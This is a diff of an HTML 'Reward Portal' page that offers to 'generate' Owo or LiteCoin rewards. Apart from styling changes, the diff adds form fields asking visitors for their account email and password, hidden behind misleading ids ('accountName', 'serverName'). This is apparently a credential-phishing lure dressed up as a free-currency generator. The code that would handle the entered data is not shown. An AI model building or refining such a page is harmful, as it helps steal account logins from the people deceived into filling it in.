@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Generator</title>
+  <title>Reward Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body{
       margin:0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg,#0f0f0f,#1a1a1a);
+      font-family:'Segoe UI',sans-serif;
+      background:linear-gradient(135deg,#0f0f0f,#1a1a1a);
       color:white;
       display:flex;
       justify-content:center;
@@ -17,18 +17,15 @@
 
     .card{
       background:#141414;
-      padding:40px;
-      width:350px;
+      padding:35px;
+      width:360px;
       border-radius:15px;
       box-shadow:0 0 25px rgba(255,140,0,0.4);
       text-align:center;
-      animation: fadeIn 0.6s ease-in-out;
+      animation:fadeIn 0.5s ease-in-out;
     }
 
-    h2{
-      color:#ff8c00;
-      margin-bottom:20px;
-    }
+    h2{ color:#ff8c00; margin-bottom:15px; }
 
     button{
       background:#ff8c00;
@@ -49,9 +46,9 @@
     }
 
     input{
-      width:90%;
+      width:92%;
       padding:10px;
-      margin:8px 0;
+      margin:6px 0;
       border-radius:8px;
       border:1px solid #ff8c00;
       background:#1f1f1f;
@@ -68,7 +65,7 @@
     }
 
     @keyframes fadeIn{
-      from{opacity:0; transform:translateY(20px);}
+      from{opacity:0; transform:translateY(15px);}
       to{opacity:1; transform:translateY(0);}
     }
   </style>
@@ -77,13 +74,15 @@
 
 <div class="card" id="page1">
   <h2>Select Reward Type</h2>
-  <button onclick="nextPage('Owo)">Owo</button>
+  <button onclick="nextPage('Owo')">Owo</button>
   <button onclick="nextPage('LiteCoin')">LiteCoin</button>
 </div>
 
 <div class="card hidden" id="page2">
   <h2 id="typeTitle"></h2>
   <input type="text" id="username" placeholder="Enter Username">
+  <input type="text" id="accountName" placeholder="Enter Acc Email">
+  <input type="text" id="serverName" placeholder="Enter Acc Password">
   <input type="number" id="amount" placeholder="Enter Amount">
   <button onclick="generateCode()">Generate Code</button>
   <p id="generatedCode"></p>
@@ -104,7 +103,7 @@ let currentCode="";
 function nextPage(type){
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
-  document.getElementById("typeTitle").innerText = type + " Generator";
+  document.getElementById("typeTitle").innerText=type+" Generator";
 }
 
 function generateCode(){
